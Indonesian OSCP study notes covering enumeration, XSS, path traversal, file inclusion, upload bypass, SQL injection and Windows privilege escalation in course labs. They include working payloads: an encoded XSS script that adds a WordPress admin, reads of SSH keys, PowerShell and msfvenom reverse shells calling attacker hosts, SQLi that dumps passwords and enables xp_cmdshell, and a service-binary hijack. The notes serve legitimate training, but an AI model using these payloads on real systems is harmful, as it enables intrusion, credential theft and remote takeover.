# oscp-notes

Learning style, jadi kata offsec ada 3 jenis saat kita mempelajari sesuatu yakni
- Menyerap informasi dengan baik
- metode menerima informasi, misalkan dengan gambar/diagram
- Praktek dan pengulangan suatu informasi

Saat kita mempelajari sesuatu, anggaplah topik terkait Active Directory Hacking, kita bisa membaca terkait teknik dan metodologi dengan melanjutkan menonton video, dan ini yang dinamakan dual encoding. Jadi informasi kita didapatkan dengan 2 informasi.


Forgetting curve yang disebutkan pada module offsec, yaitu seberapa lama otak menyimpan suatu informasi yang dilakukan penelitian pada tahun 1885. intinya para ilmuwan mencoba untuk menghafal suatu text/dokumen yang pada saat itu mereka hanya bisa menghafal 100% setelah latihan menghafal, dan selama beberapa waktu daya ingat pada dokumen tersebut turun yang pada akhirnya keesokan harinya menjadi 23%.

Ada juga yang disebut beban kognitif, yaitu cara otak memproses suatu informasi yang bisa dibayangkan jika otak sebuah ruangan yang terbagi dengan bagian bagian kecil lalu kita memasukkan terlalu banyak informasi, yang pada akhirnya tidak akan ada cukup ruang untuk informasi lainnya



#### Enumeration

Lolbas(living off the land binaries and scripts) merupakan utilitas / script bawaan windows. Seperti whoami.exe, ping.exe maupun netstat.exe yang dapat digunakan untuk keperluan eksekusi

https://lolbas-project.github.io/



**Forward dns enum**

```
//Check ip address sub/domain using host
host ftp.megacorpone.com

//output 
router.megacorpone.com has address 167.114.21.70
```

kita bisa menghitung rentang IP address dari 167.114.21.X untuk mendapatkan semua subdomain dari megacorpone.com

```

//check range 60 - 100
for ip in $(seq 60 100); do host 167.114.21.$ip; done | grep -v "not found"


//output
61.21.114.167.in-addr.arpa domain name pointer monitoramento.nortehost.com.
64.21.114.167.in-addr.arpa domain name pointer admin.megacorpone.com.
65.21.114.167.in-addr.arpa domain name pointer beta.megacorpone.com.
66.21.114.167.in-addr.arpa domain name pointer fs1.megacorpone.com.
67.21.114.167.in-addr.arpa domain name pointer intranet.megacorpone.com.
68.21.114.167.in-addr.arpa domain name pointer mail.megacorpone.com.
69.21.114.167.in-addr.arpa domain name pointer mail2.megacorpone.com.
70.21.114.167.in-addr.arpa domain name pointer router.megacorpone.com.
71.21.114.167.in-addr.arpa domain name pointer siem.megacorpone.com.
72.21.114.167.in-addr.arpa domain name pointer snmp.megacorpone.com.
73.21.114.167.in-addr.arpa domain name pointer syslog.megacorpone.com.
```

using dns recon 

```
//standar scanning
dnsrecon -d megacorpone.com -t std

-t std artinya standar

//brute subdomain using file
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

#### Day 2

#### SNMP
SNMP singkatan dari simple network management protocol yang didasarkan pada protocol UDP. SNMP banyak digunakan terkait routing dan management jaringan, yang mana protokol SNMP 1,2 dan 2c yang umum tidak menggunakan enkripsi traffic.

SNMP juga memiliki fitur authentication, yang dimana dikenal dengan community string yang merupakan credential untuk melakukan kontrol ke MIB untuk monitoring dengan value default "public"(read only) dan private(read write). 

MIB sendiri berisi informasi terkait management jaringan atau bisa disebut database yang diorganisasikan seperti pohon. Contoh nilai MIB yang sesuai dengan parameter SNMP microsoft, yang berguna untuk beberapa informasi dan lebih dari sekedar informasi jaringan

|                        |                      |     |
| ---------------------- | -------------------- | --- |
| 1.3.6.1.2.1.25.1.6.0   | Proses Sistem        |     |
| 1.3.6.1.2.1.25.4.2.1.2 | Menjalankan Program  |     |
| 1.3.6.1.2.1.25.4.2.1.4 | Jalur Proses         |     |
| 1.3.6.1.2.1.25.2.3.1.4 | Unit Penyimpanan     |     |
| 1.3.6.1.2.1.25.6.3.1.2 | Nama Perangkat Lunak |     |
| 1.3.6.1.4.1.77.1.2.25  | Akun Pengguna        |     |
| 1.3.6.1.2.1.6.13.1.3   | Port Lokal TCP       |     |

enumeration SNMP 1 network
```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

Jadi setelah ditemukan port terbuka, kita bisa lanjut enum dengan nilai MIB yang ada pada table diatas. atau sebelum itu, kita bisa menggunakan snmpwalk untuk melakukan enumeration seluruh MIB tree.

```
snmpwalk -c public -v1 -t 10 192.168.50.151
```

Juga kita bisa menggunakan acuan table MIB diatas untuk melakukan enumeration. Contoh untuk melakukan enumeration windows user dengan acuan MIB value 1.3.6.1.4.1.77.1.2.25 : 

```
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
```


#### Nmap Scripting Engine
Merupakan salah satu toolset dari nmap yang digunakan untuk melakukan identifikasi kerentanan melalui CVE yang dikumpulkan. NSE dapat ditemukan pada directory **/usr/share/nmap/scripts/** dengan extension .nse


#### day 3

Brute force API endpoint using gobuster

Kita bisa langsung melakukan brute path dengan spesifik endpoint seperti berikut, yang dimana -p merupakan pattern/pola endpoint, dengan isi :
```
//isi file pattern
{GOBUSTER}/v1
{GOBUSTER}/v2

//run using pattern
gobuster dir -u http://192.168.55.16:5002/ -w /usr/share/wordlists/dirb/common.txt -p pattern

```
#### Day 4

Hari ini masih di module introduction web application attack, dimana kita belajar terkait beberapa informasi yaitu header, inspect element, front dan back end lalu analysis di sisi client side seperti CSS, js dan HTML. Disini juga belajar untuk melakukan intercept menggunakan burp suite.


Kita belajar banyak terkait XSS(cross site scripting) dimana dijelaskan tentang XSS reflected dan stored pada module ini, lalu bagaimana kita bisa melakukan injection code HTML/javascript untuk meningkatkan hak akses. Lalu saya juga belajar tentang cookies, yang dimana cookies merupakan suatu komponen untuk melakukan tracking informasi dari user / visitor pada website. 

Cookies juga mempunyai 2 opsi yaitu secured dan HttpOnly
- Secured: merupakan opsi yang mengintruksikan browser untuk mengirim cookies hanya jika web application menggunakan TLS/SSL(https)
- HttpOnly : untuk melakukan intruksi browser untuk menolak akses javascript ke cookies. Jika flag ini tidak diatur, maka potensi untuk melakukan cookies stealing bisa terjadi.


Disini kita belajar praktek terkait XSS untuk melakukan privilege escalation, yaitu disini menggunakan plugin wordpress visitor. Pertama terdapat kerentanan XSS pada plugin ini dimana XSS ini ada di bagian header user-agent, yaitu visitor bisa menyisipkan user-agent berbahaya dan dieksekusi di panel admin.


script js dibawah ini berfungsi untuk melakukan create admin dengan login attacker beserta passwordnya
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";

//regex untuk extract nonce
var nonceRegex = /ser" value="([^"]*?)"g/;
ajaxRequest("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Selanjutnya kita lakukan minified / compress javascript diatas agar hanya 1 line code saja pada domain ini : https://jscompress.com/

```
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"g/;ajaxRequest("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

menjadi seperti ini, kita bisa melakukan encoding menjadi UTF-16 menggunakan charCodeAt() untuk meminimalkan penggunaan character yang menganggu 

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('sisipkan code js disini')
console.log(encoded)
```
kemudian untuk eksekusi, kita menggunakan fromCharCode untuk melakukan decode terlebih dahulu yang dibungkus dengan fungsi eval()

```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

argument proxy, untuk melempar request kita ke burp suite dengan catatan intercept harus di aktifkan. Selanjutnya, saat admin mengunjungi halaman visitor seharusnya user attacker berhasil ditambahkan.


Lalu dilanjut kita belajar tentang common web application attack, dengan 4 topik berikut :

- Directory Traversal
- Local File Inclusion
- Arbitrary File Upload
- Command Injection


Pada directory traversal dijelaskan juga bagaimana perbedaan relative dan absolute path serta perbedaan bagaimana suatu file dipanggil di operating system linux dan windows.

Dimana kita ditugaskan untuk membaca suatu SSH key pada machine dengan IP 192.168.65.16, yang mana terdapat parameter page seperti berikut : 

```
http://192.168.65.16/meteor/index.php?page=admin.php
```

Kerentanan Directory Traversal, artinya kita bisa menyalahgunakan fitur baca file melalui parameter page ke file yang kita tentukan seperti /etc/passwd maupun ~/.ssh/id_rsa

```

//membaca private key ssh pada user offsec.
http://192.168.65.16/meteor/index.php?page=../../../../../home/offsec/.ssh/id_rsa
```

Juga kita ditugaskan untuk melakukan exploit grafana pada port 3000, yang terdapat kerentanan path traversal, jadi kita diharuskan untuk membaca file C:/Users/install.txt. Kerentanan directory traversal pada grafana ini terdapat pada saat pemanggilan plugin file 

```
curl --path-as-is "http://192.168.65.193:3000/public/plugins/alertlist/../../../../../../../../../Users/install.txt"


//output : OS{878adbbb83886647f6cec29fb66ef29f}
```

Kita bisa langsung membaca file melalui directory /plugins, dengan menggunakan opsi --path-as-is pada curl, character kita tidak akan dilakukan pemangkasan.

Disini kita juga belajar bagaimana melakukan serangan menggunakan URL encoding, jadi URL encoding digunakan untuk menghindari WAF dan sebagainya.

```
curl --path-as-is http://192.168.65.16/cgi-bin/%2e%2e//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords 


//output : OS{999de23aeab5cf90de4295423865460f}
```

Lalu pada grafana, kita juga di tugaskan untuk membaca /opt/install.txt dengan URL encode

```
curl --path-as-is "http://192.168.65.16:3000/public/plugins/alertmanager/2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//%2e%2e/%2e%2e/opt/install.txt" 
```

#### Day 5

Masih dibagian wrapper PHP dan common attack web application, yakni suatu wrapper pada php merupakan schema/protokol yang digunakan untuk melakukan fungsionalitas tertentu.

beberapa wrapper PHP yang bisa digunakan yaitu :
 - php://filter
 - data:// dengan contoh berikut :
 ```
   curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
   ```


Lalu kita belajar juga terkait RFI(Remote File Inclusion) dimana kerentanan ini terjadi ketika suatu code melakukan eksekusi script PHP dari external URL dengan syarat allow_url_include(bukan konfigurasi default) perlu diaktifkan. Jadi kita belajar bagaimana memanggil script external URL seperti contoh berikut :

```
curl "http://192.168.68.16:8001/meteor/index.php?page=http://192.168.49.68:8000/php-reverse-shell.php"
```

kita memanggil 192.168.49.68:8000 yang disini sudah kita siapkan python SimpleHTTPServer beserta reverse shell, saat curl diatas di eksekusi seharusnya reverse shell berjalan pada listener kita

#### Arbitrary File Upload

Kita juga belajar terkait bagaimana melakukan bypass file upload, seperti menggunakan extension yang incase sensitive(phps, php7, phP, pHP dll) dan juga bagaimana melakukan reverse shell pada windows menggunakan powershell.

Contoh untuk membuat payload reverse shell sederhana menggunakan powershell

```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.49.62",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedUrl = [System.Net.WebUtility]::UrlEncode($EncodedText)   
$EncodedUrl

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAw....//some
```

Setelah itu baru kita aktifkan listener dan eksekusi pada webserver target 

```
192.168.68.189/meteor/uploads/simple.pHP?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMwAiACwANAA0ADQANAApADsAJAB
```


Bukan cuma itu aja, terkadang file upload itu sesuai dengan tech stack yang dipakai, anggaplah suatu fitur upload pada nodejs, java maupun flask kita tidak bisa melakukan upload php webshell karena perbedaan teknologi. 

Tapi dalam hal ini, kita gaboleh putus asa dan ada kemungkinan untuk melakukan overwrite pada filesystem yang ada.  Sebagai contoh, kita bisa melakukan overwrite public key ssh pada user tertentu dengan catatan, file upload kita bisa melakukan path traversal seperti berikut ini 

```
../../../../../../../heker/.ssh/authorized_keys
```

Kita bisa melakukan intercept burp dan mengisi filename menjadi seperti itu, dan jika izin / permission sesuai seharusnya file authorized_keys kita overwrite menjadi milik kita

```
POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
Content-Type: multipart/form-data; boundary=---------------------------241024601442090678882604995265
Content-Length: 645
Origin: http://mountaindesserts.com:8000
Connection: keep-alive
Referer: http://mountaindesserts.com:8000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------241024601442090678882604995265
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../root/.ssh/authorized_keys"
Content-Type: text/plain

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4UY7y1ILYRq6f0fkvE9ugwYjW+Iqgf9wIunDtzDrOzc5y1SCTcMX802s/9ckZPYhdM0Erot/WnE9BQEvy5E0QJHKeTGjBOHNouICsd47WWaZS1RZg4F65f481+xplmw6CYr2cD5VGyOGRFizklrDdZjrH85pworogbcoOf8G/N4Q9aUc2RbKkui5/V3aXXX/vJk5+vLhnPJD9GE/Xr7R4E9VPU0QqoFYr+Mj47ZnPE7A5QBtbOPDmno0LrfMV1yc7joO5FfsYpXm2x58eyqhCjJ4VSCacHaf04+6ovXFU2Fm4VgJeTuZHvKR9TNHsSRGbF/gMOKoW8rTHAcDG7Te9 


```



#### Command Injection 
Ini skip dulu dahhh



#### SQL Injection

Nah ini baru kita sampe di module 10 yang membahas SQL Injection. Disini kita belajar terkait SQL injection manual dan automation serta jenis jenis database. 

Pertama kita diajarin tentang command / query SQL pada 2 dbms yakni MySQL dan MSSQL. Pada MSSQL kita diajarkan bagaimana melakukan koneksi remote menggunakan sqlcmd dan impacket. command untuk remote connect impacket seperti ini 
```

//connect
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

//menampilkan version
SELECT @@version;

//menampilkan semua db
SELECT name FROM sys.databases;

//menampilkan table pada database 
SELECT * FROM offsec.information_schema.tables;

//menampilkan tables system
select * from master.sys.system_objects;

//menampilkan semua internal tables
select * from master.sys.all_objects;

//extract value dari colum user dengan rumus table_catalog.table_schema.table_name
select * from offsec.dbo.users;
```

#### Day 6
Masih di module SQL injection, dan hari ini aku mau untuk clearkan module ini. jadi kita diajarkan skenario untuk melakukan serangan SQL injection, dimana terdapat suatu form login dan saat kita menginput tanda '(petik) maka akan terjadi error. ini terjadi secara in-band, yaitu aplikasi yang rentan memberikan hasil  query bersamaan dengan nilai/value yang di return.

Disini kita belajar terkait SQL in-band dan out-band, dan kita juga diajarkan cara exploit SQL secara manual yang dimulai dari union, error, boolean dan time based.

column username diisi dengan :
```
' or 1=1 in (select @@version)-- 
```
maka akan tampil version, jika kita mau menampilkan password dari column tertentu maka :

```
' OR 1=1 in (select password from users)-- 

//jika spesifik username tertentu 
' OR 1=1 in (select password from users where username='admin')-- 
```


Union based, jadi kita menggunakan query union untuk melakukan serangan tapi sebelum itu kita perlu juga untuk mengetahui jumlah column pada table dengan menggunakan order by

```

//disini order by dengan value 1 tidak terjadi apa apa, maka dari itu kita akan menaikan hingga terjadi error syntax
' order by 1-- //

lalu dilanjut untuk mencari angka yang bisa diisi string
%' union select 1,2,3,4,5-- //

setelah ditemukan, kita bisa melakukan injeksi fungsi fungsi sql
' UNION SELECT null, null, database(), user(), @@version-- //

menampilkan column dan table

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

//extract value column
' UNION SELECT null, username, password, description, null FROM users -- //

```

Kemudian kita lanjut ke blind SQLi yang dimana terdapat 2 klasifikasi yang berdasarkan boolean ataupun time based.

```
//check boolean based, jika benar maka return seperti umumnya (admin user valid)
http://192.168.54.16/blindsqli.php?user=admin' AND 1=1 -- //

//check time 3 detik, jika kondisi true (admin user valid)
http://192.168.54.16/blindsqli.php?user=admin' AND IF(1=1, sleep(3),'false')-- //
```


#### Postgre
Kita juga disini belajar injection di postgre, dan macem macem intinya. pada postgre kita diajarin terkait error based juga

```
//check current db 
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1

weight=1&height=1' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1'-- -&age=1&gender=Male&email=asd@mail.com
```

Dan menggunakan sqlmap untuk read flag pada /var/www/flag.txt

#### MSSQL
Pada mssql, kita diberikan suatu target windows server dengan backend asp, setelah melakukan enum terdapat halaman login yang disitu terdapat kerentanan SQL injection.

Langsung saja eksekusi, dimana kita perlu cek apakah memang payload/query kita dijalankan dengan methode time based, dikarenakan tidak adanya output yang tampil.

```
//menunggu 10 detik
';waitfor delay '0:0:10'--

//activation xp_cmdshell.
admin'; exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

Setelah di eksekusi ternyata response lambat dan tampil 10 detik, maka lanjut untuk melakukan configure xp_cmdshell.

setelah semua berhasil, kita bisa melakukan reverse shell dengan powershell.
```
test';EXEC+xp_cmdshell+'powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADYAMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D'--
```
dan flag ada di directory C:\inetput\wwwroot\flag.txt

#### Day 7

Disini kita belajar terkait module windows Privilege Escalation.

ada beberapa topik yang akan dibahas
- Pengumpulan informasi sensitive pada OS(cred, txt, powershell)
- Penyalahgunaan service 
- Component lain dari windows yang berpotensi vulnerable
- penggunaan exploit 

#### Access Control
Hak akses merupakan izin tertentu untuk mengizinkan atau menolak operasi.
Konsep dan mekanisme pada windows : 

- Security Identifier
- Access Token
- Mandatory Integrity Control
- User Account Control


RID dimulai dari 1000 dan RID dibawah 1000 disebut well-known SID yaitu bisa dikatakan user / group bawaan sistem 
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

Token akses dibuat saat user di authentikasi. Dan token itu sendiri menggambarkan konteks keamanan pada user tertentu. Ketika suatu user menjalankan thread/proses, ada token yang diberikan kepada object tersebut yang disebut primary token dan menentukan izin yang dimiliki proses/thread pada object lainnya dan merupakan salinan dari user token. 

Impersonation Token, yaitu token yg menyediakan konteks keamanan berbeda, yang artinya thread akan berinteraksi dengan object lain dari token impersonation bukan token process utama.

Selain SID dan token, ada namanya mandatory integrity control, yang membatasi akses ke object berdasarkan tingkat integritas. jadi pada suatu process, dibagi berdasarkan integritasnya misalkan low, medium dan high yang merupakan suatu kepercayaan yg diberikan windows kepada object sehingga process dengan low integrity dibatasi untuk memodifikasi pada object yang ber-integrity tinggi. Selain itu ada UAC(User Account Control) yang merupakan fitur pada windows untuk membatasi peningkatan hak akses.


#### Information Gathering

Apa saja informasi pertama yang harus kita dapatkan ?
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```


Command : 
```
Get-LocalGroup / net user : check group
route print : check routing network
```


#### Day 8

Masih di bagian windows privilege escalation. Jadi seperti di hari sebelumnya, kita ditugaskan untuk mencoba melakukan peningkatan hak akses dari credential tersimpan, service yang rentan, scheduled task dan lainnya.

```

//Untuk menemukan credential, atau file sensitive.

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue


//Untuk login pada user lain
runas /user:offsec cmd
```

Pada bagian ini, kita belajar untuk mendapatkan informasi dari logging powershell. logging akan disimpan dalam file transcript, dan untuk memeriksa apakah script block logging diaktifkan, kita bisa menggunakan cmdlet 

```
Get-History
```

Tapi disini kadang kosong, karena administrator menggunakan command Clear-History untuk menghapus semua riwayat. Tapi sebenarnya, clear-history tidak menghapus command history dan kita bisa manfaatkan PSReadline

```
//untuk menampilkan informasi path
(Get-PSReadlineOption).HistorySavePath
```

Enter-PSSession secara default menggunakan winrm untuk melakukan interaksi dan powershell remoting. alternatifnya, kita bisa menggunakan evil-winrm untuk ini.

```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

Kita juga bisa menggunakan winpeas untuk melakukan auto enumeration, pada kali bisa kita install menggunakan : sudo apt install peass 

Sekarang masuk ke windows service, yang dimana ada beberapa method yaitu : 
- Hijack service binaries
- Hijack service DLLs
- Abuse Unquoted service paths

Service windows yang berjalan di background, di kontrol oleh Service Control Manager dan dapat di gunakan menggunakan tools powershell maupun sc.exe

```

//check Nama, pathname dari suatu service yang berjalan
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

//Get service specific name
 Get-CimInstance Win32_Service | Where-Object {$_.Name -eq 'RmSvc'} | Format-List Name, DisplayName, State, StartMode, StartName, PathName, Description


//check process exclude specific directory

Get-CimInstance -Class Win32_Process | Where-Object -Property Path -NotMatch @("Windows|Program Files") | Select-Object Name, ProcessId, Path


//using wmic 
 wmic service get Name,State,PathName
```

Disini, kita menemukan service mysql, yang mana dengan izin allow access ke semua user. jadi dengan mudah kita melakukan generate reverse shell menggunakan msfvenom dan melakukan replace ke binary tersebut. 

```
//generate in linux
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.218 LPORT=4444 -f exe > shell.exe

//download using curl/certutil/iwr and then copy to directory mysql 
 iwr -uri http://192.168.48.3/shell.exe -Outfile shell.exe
 move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 move .\shell.exe C:\xampp\mysql\bin\mysqld.exe
```

karena kita tidak ada izin untuk merestart service, jadi kita bisa melakukan shutdown pada sistem operasi.

```
shutdown /r /t 0
```

tapi jika ada izin kita bisa melakukan restart service menggunakan command net. net restart servicename


DLL hijacking, yaitu suatu teknik melakukan replace DLL yang sah / hilang dengan DLL berbahaya.

Untuk check semua application/program yang terinstall:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Lalu buka process monitor dan temukan salah satu program dengan DLL not found / writable yang selanjutnya bisa kita lakukan replace dan overwrite dengan DLL custom kita sendiri.


Unquoted service path merupakan salah satu attack vector yang dimana terdapat miskonfigurasi pada path binary dengan spasi sehingga representasi dari pathnya seperti ini :

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

Check service and path name untuk identifikasi unquoted service path
```
wmic service get Name,PathName | findstr /i /v "C:\windows"

//check unquoted service path specific
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

jadi saat ada path seperti ini : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

yang terjadi adalah :
```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

dan saat salah satu dir ini writable, kita bisa mengisi dengan program kita sendiri.

#### Day 9

Masih di windows privilege escalation ya, jadi untuk hari ini kita belajar terkait dengan scheduled task pada windows. jadi dalam windows ada yang namanya scheduled task yaitu suatu tugas yang dijalankan pada interval waktu tertentu yang didefinisikan dengan satu atau lebih pemicu/trigger

informasi penting : 
- Siapa yang menjalankan 
- Trigger apa yang ditentukan untuk task tersebut
- Tindakan / aksi apa yang dijalankan saat trigger terpenuhi


Pada prakteknya, kita bisa menggunakan command : 
```
//powershell
Get-SheduledTask

//cmd
schtasks /query /FO LIST /v
```

